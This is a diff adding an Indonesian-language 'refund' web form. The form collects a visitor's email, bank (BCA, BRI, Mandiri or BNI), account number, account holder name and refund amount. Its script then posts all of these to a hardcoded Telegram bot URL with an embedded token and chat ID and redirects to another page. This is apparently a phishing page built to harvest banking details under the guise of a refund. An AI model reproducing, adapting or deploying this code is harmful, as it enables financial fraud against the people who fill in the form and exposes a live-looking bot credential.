@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="Red">
+<title>Formulir Refund Dana</title>
+<style>
+  .container {
+    max-width: 600px;
+    margin: 0 auto;
+    padding: 20px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+  }
+
+  .form-group {
+    margin-bottom: 15px;
+  }
+
+  label {
+    display: block;
+    font-weight: bold;
+  }
+
+  input[type="text"],
+input[type="email"],
+select,
+input[type="number"] {
+    width: 100%;
+    padding: 10px;
+    border: 2px solid #ff0000;
+    border-radius: 5px;
+    max-width: 300px;
+    font-weight:bold;
+  }
+
+  button {
+    background-color: #ff0000;
+    color: white;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight:bold;
+  }
+
+  button:hover {
+    background-color: #000000;
+    font-weight:bold;
+  }
+
+  #refundDetails {
+    margin-top: 20px;
+    display: none;
+    background-color: #000000;
+    padding: 20px;
+    border-radius: 5px;
+    color: white;
+  }
+
+  #submitBtn {
+    margin-top: 20px;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h2>Formulir Refund Dana</h2>
+  <form id="refundForm" onsubmit="submitForm(event)">
+    <div class="form-group">
+      <label for="platform">Platform Penyedia:</label>
+      <input type="text" id="platform" name="platform" required maxlength="50">
+    </div>
+    <div class="form-group">
+      <label for="email">Alamat Email:</label>
+      <input type="email" id="email" name="email" required maxlength="50">
+    </div>
+    <div class="form-group">
+      <label for="bank">Pilihan Nama Bank:</label>
+      <select id="bank" name="bank" required>
+        <option value="BCA">BCA</option>
+        <option value="BRI">BRI</option>
+        <option value="Mandiri">Mandiri</option>
+        <option value="BNI">BNI</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label for="account">Nomor Rekening:</label>
+      <input type="number" id="account" name="account" required maxlength="20">
+    </div>
+    <div class="form-group">
+      <label for="accountName">Nama Pemilik Rekening:</label>
+      <input type="text" id="accountName" name="accountName" required maxlength="50">
+    </div>
+    <div class="form-group">
+      <label for="refundAmount">Jumlah Refund:</label>
+      <input type="number" id="refundAmount" name="refundAmount" required>
+    </div>
+    <button type="submit">Selanjutnya</button>
+  </form>
+  <div id="refundDetails">
+    <h2>Detail Refund</h2>
+    <p id="platformOutput"></p>
+    <p id="emailOutput"></p>
+    <p id="bankOutput"></p>
+    <p id="accountOutput"></p>
+    <p id="accountNameOutput"></p>
+    <p id="refundAmountOutput"></p>
+    <button id="submitBtn" onclick="submitToTelegram()">Sudah Benar Lanjutkan</button>
+  </div>
+</div>
+
+<script>
+  function submitForm(event) {
+    event.preventDefault();
+    var formData = new FormData(event.target);
+    document.getElementById('platformOutput').innerText = 'Platform Penyedia: ' + formData.get('platform');
+    document.getElementById('emailOutput').innerText = 'Alamat Email: ' + formData.get('email');
+    document.getElementById('bankOutput').innerText = 'Pilihan Nama Bank: ' + formData.get('bank');
+    document.getElementById('accountOutput').innerText = 'Nomor Rekening: ' + formData.get('account');
+    document.getElementById('accountNameOutput').innerText = 'Nama Pemilik Rekening: ' + formData.get('accountName');
+    document.getElementById('refundAmountOutput').innerText = 'Jumlah Refund: ' + formData.get('refundAmount');
+    document.getElementById('refundForm').style.display = 'none';
+    document.getElementById('refundDetails').style.display = 'block';
+  }
+
+  function submitToTelegram() {
+    var formData = new FormData(document.getElementById('refundForm'));
+    var message = 'Formulir Refund Dana:\n\n';
+    message += 'Platform Penyedia: ' + formData.get('platform') + '\n';
+    message += 'Alamat Email: ' + formData.get('email') + '\n';
+    message += 'Pilihan Nama Bank: ' + formData.get('bank') + '\n';
+    message += 'Nomor Rekening: ' + formData.get('account') + '\n';
+    message += 'Nama Pemilik Rekening: ' + formData.get('accountName') + '\n';
+    message += 'Jumlah Refund: ' + formData.get('refundAmount') + '\n';
+  
+    sendToTelegram(message);
+    // Simulasi pindah ke halaman vera.html
+    window.location.href = "tanya.html";
+  }
+
+  function sendToTelegram(message) {
+    var token = 'TOKEN_BOT_ANDA';
+    var chatId = 'ID_GRUP_ATAU_PENGGUNA';
+    var url = `https://api.telegram.org/bot6717126152:AAFTN1s9uWFLXPxQveF3oTLT2qV3sQ22OqI/sendMessage?chat_id=6660970959&text=${message}`;
+    
+    fetch(url, { method: 'POST' })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log(data);
+            // Tambahkan logika tambahan jika diperlukan
+        })
+        .catch(error => {
+            console.error('There was a problem with your fetch operation:', error);
+        });
+  }
+</script>
+
+</body>
+</html>
